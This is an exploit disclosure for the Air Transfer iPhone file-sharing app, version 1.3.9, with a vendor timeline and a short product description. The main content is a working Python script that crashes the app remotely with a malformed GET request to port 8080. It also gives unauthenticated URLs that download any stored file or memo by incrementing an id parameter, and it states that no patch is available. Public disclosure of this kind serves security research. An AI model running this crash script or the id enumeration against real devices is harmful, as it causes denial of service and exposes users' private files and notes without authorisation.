@@ -1,0 +1,107 @@
+# Exploit Title: Air Transfer Iphone v1.3.9 -Remote crash, Broken Authentication file download and Memo Access.
+# Date: 08/23/2014
+# Author: Samandeep Singh (SaMaN - @samanL33T )
+# Vendor Homepage:http://www.darinsoft.co.kr/sub_htmls/airtransfer_guide.html 
+				  https://itunes.apple.com/us/app/air-transfer/id521595136?mt=8
+# Category: WebApp
+# Version: 1.3.9
+# Patch/ Fix: Not available
+---------------------------------------------------
+
+Disclosure Time line
+=======================
+[Aug. 19 2014]  Vendor Contacted
+[Aug. 19 2014]  Vendor replied
+[Aug. 19 2014]  Vendor Informed about vulnerability with POC.(No reply received)
+[Aug. 21 2014]  Notified vendor about Public disclosure after 24 hours (No reply received)
+[Aug. 23 2014]  Public Disclosure.
+
+--------------------------------------------------------
+
+Product & Service Details:
+==========================
+Air Transfer - Easy file sharing between PC and iPhone/iPad, File Manager with Document Viewer, Video Player, Music Player and Web Browser.
+
+Features include:
+-----------------
+
+* The easiest way to transfer files between PC and iPhone/iPad ! 
+* Just Drag & Drop your contents and Play: Text, Bookmark, Image and Photo, Music, Movie, Documents and more through wireless connection !
+
+
+
+Vulnerability details
+=========================
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+1. Remote Application Crashing
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+#!/usr/bin/python
+import socket
+import sys
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+host=raw_input("Enter IP : ")
+port=8080
+def connect():
+    try:
+        s.connect((str(host),port))
+    except socket.error:
+        print "Error: couldn't connect"
+        sys.exit()
+    return "connected to target"
+#Crashing the App
+def crashing():
+    req="GET /getList?category=categoryAll?pageNo=1&key= HTTP/1.1\r\n\r\n"
+    try:
+        s.sendall(req)
+    except:
+        print "Error occured, Couldn't crash App"
+        sys.exit()
+    return "Application Down, Conection closed"  
+print connect()
+print crashing()
+______________________________________________________________________________________________________________________________
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+2. Broken Authentication - Memo access & File download.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+To download any file simply visit:
+
+http://<IP>:8080/?downloadSingle?id=1
+
+Just by incrementing the value of "id" we can download all the files.  
+
+TO view saved memos visit the below link:
+
+http://<IP>:8080/getText?id=0
+
+
+We can look for all the memos by incrementing the value of "id"
+
+
+
+#SaMaN(@samanL33T)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
